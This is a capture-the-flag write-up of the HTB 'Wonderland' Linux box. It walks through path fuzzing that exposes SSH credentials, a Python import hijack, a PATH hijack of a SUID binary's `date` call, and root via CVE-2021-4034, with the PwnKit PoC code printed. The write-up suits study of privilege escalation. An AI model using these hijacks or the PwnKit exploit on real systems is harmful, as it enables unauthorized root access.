---
layout: post
title: "HTB: Wonderland"
subtitle: "Fuzz the r/a/b/b/i/t path for alice's creds, a Python random-import hijack and a SUID date hijack for lateral moves, then PwnKit to root"
date: 2023-04-03
tags: [htb, linux, fuzzing, python-hijack, path-hijack, cve-2021-4034, privesc]
category: writeups
kind: machine
os: Linux
tldr: "Content discovery is the whole early game. Walking the r/a/b/b/i/t path one segment at a time surfaced alice's SSH credentials. Lateral movement stacked two tricks, a Python import hijack on the random module to reach rabbit, then a SUID teaParty binary that runs date off a relative PATH to reach the uid-1003 account. Root fell to CVE-2021-4034 (PwnKit) against the old polkit shipped alongside sudo 1.8.21p2."
---

## the box

Wonderland is a Linux box at `10.10.0.250`. The recurring theme is content discovery feeding the next step: the front page hands you a thread to pull, and every step down the chain is one user handing the keys to the next. The web path spells out `r a b b i t` one directory at a time and drops alice's SSH credentials at the end. From alice, a Python script runnable as `rabbit` imports `random` from a directory I can write, so a planted `random.py` runs as rabbit. A SUID `teaParty` binary then drops to uid 1003 and calls `date` on a relative PATH, a second hijack. Root is CVE-2021-4034, the polkit PwnKit bug, which lands from any unprivileged account the moment I have a shell.

## recon

Full sweep then a service scan on what came back.

```bash
$ nmap -p- --min-rate 10000 10.10.0.250
$ nmap -sCV -p <open> 10.10.0.250
```

Two ports answered: SSH, and an HTTP server on `80`. The landing page was Alice-in-Wonderland themed and pointed straight at the white rabbit, so I pulled the page images and ran the usual reflex pass over them.

```bash
$ strings -n8 white_rabbit_1.jpg alice_door.jpg
$ binwalk -e alice_door.png
$ steghide info alice_door.jpg
```

`binwalk` carved a couple of embedded zlib streams out of `alice_door.png` and nothing that decompressed to anything useful. The images were a detour. The real lead was the text: follow the rabbit.

```
follow the r a b b i t
```

## foothold

The path is built one segment at a time, not guessed whole. I fuzzed each level, took the single directory that came back, and fuzzed again from there.

```bash
$ feroxbuster -u http://10.10.0.250/r/
$ feroxbuster -u http://10.10.0.250/r/a/
# ... keep going, one letter per level
```

That walks out to `/r/a/b/b/i/t/`. The page at the bottom of the path carried alice's login in its body, her password being a line straight out of the Carroll poem:

```
alice : HowDothTheLittleCrocodileImproveHisShiningTail
```

Those creds worked over SSH.

```bash
$ ssh alice@10.10.0.250
```

## alice to rabbit

Enumeration from alice's shell pointed at a Python script she was allowed to run as `rabbit`, and the script did an `import random`. CPython resolves imports from the script's own directory before the standard library, so a `random.py` sitting next to the script wins. I dropped one in the directory I controlled:

```python
import os
os.system("/bin/bash")
```

Running the script as rabbit imported my module instead of the stdlib `random`, and the payload ran with rabbit's privileges. That is a shell as rabbit.

## rabbit to hatter

rabbit's home held a SUID binary, `teaParty`. It is a small non-stripped PIE:

```
teaParty: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

`main` is the whole story. It drops to uid/gid `0x3eb` (1003), prints the tea-party banner, then shells out:

```asm
mov    edi,0x3eb
call   setuid@plt
mov    edi,0x3eb
call   setgid@plt
lea    rdi,[rip+0xe74]        ; "Welcome to the tea party!..."
call   puts@plt
lea    rdi,[rip+0xea8]
call   system@plt
```

The string handed to `system` is in `.rodata`:

```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

`date` is invoked by name, not by absolute path, and the binary has already set the effective uid to 1003 before the call. So I prepend a writable directory to `PATH`, drop a `date` there that spawns a shell, and run `teaParty`. `system` resolves my `date` and runs it as uid 1003.

```bash
$ echo '/bin/bash' > /tmp/date
$ chmod +x /tmp/date
$ PATH=/tmp:$PATH /path/to/teaParty
```

That gives a shell as the uid-1003 account (hatter).

## root

`linpeas` flagged the stack as old. Sudo came back as `1.8.21p2`, and the CVE check called it out directly:

```
Sudo version 1.8.21p2

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034
```

CVE-2021-4034 is PwnKit, the polkit `pkexec` local privilege escalation. `pkexec` mishandles an invocation with zero arguments, reads out of bounds into the environment, and can be steered into loading an attacker-controlled `GCONV_PATH` gconv module as root. I used berdav's PoC. The launcher just sets up the poisoned environment and `execve`s `pkexec`:

```c
char * const environ[] = {
    "pwnkit.so:.",
    "PATH=GCONV_PATH=.",
    "SHELL=/lol/i/do/not/exists",
    "CHARSET=PWNKIT",
    "GIO_USE_VFS=",
    NULL
};
return execve("/usr/bin/pkexec", args, environ);
```

The `pwnkit.so` it points at is the gconv module, and its `gconv_init` is where root lands:

```c
void gconv_init(void *step)
{
    char * const args[] = { "/bin/sh", NULL };
    setuid(0);
    setgid(0);
    execve(args[0], args, environ);
}
```

Build it on target and run it:

```bash
$ make
$ ./cve-2021-4034
```

That returned a root shell immediately. PwnKit does not care which account you fire it from, so it closes the box from rabbit or hatter either way. I read the user and root flags and submitted them.